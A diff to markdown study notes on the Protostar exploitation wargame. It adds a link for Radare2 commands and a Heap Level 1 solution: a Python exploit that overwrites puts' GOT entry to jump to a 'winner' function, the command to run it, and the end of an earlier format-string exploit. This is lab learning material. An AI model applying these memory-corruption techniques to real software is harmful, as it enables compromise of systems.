@@ -329,7 +329,7 @@ We know that using chmod command we can change the permissions of a file to read
 
 ## Radare2
 
-Radare2 is a great tool for debugging just like gdb. More about this later.
+Radare2 is a great tool for debugging just like gdb. Check it in this [folder](https://github.com/Souptik2001/getting-basic/tree/master/radarecommands).
 
 ## Starting with protostar
 
@@ -579,3 +579,32 @@ exploit+="%4$33616x"
 exploit+="%5$n"
 print exploit
 ```
+
+### Heap Level 1 (./heap1)
+
+```python
+import struct
+WINNER=0x8048494
+PUTPLT=0x8049774
+exploit="AAAABBBBCCCCDDDDEEEE"
+exploit+=struct.pack("I", PUTPLT)
+exploit+=" "
+exploit+=struct.pack("I", WINNER)
+print exploit
+```
+
+Run the exploit as:
+
+```bash
+./heap1 `python exploit.py`
+```
+
+Don't run it as:
+❌
+
+```bash
+./heap1 "`python exploit.py`"
+```
+
+❌
+because here you have two parameters.
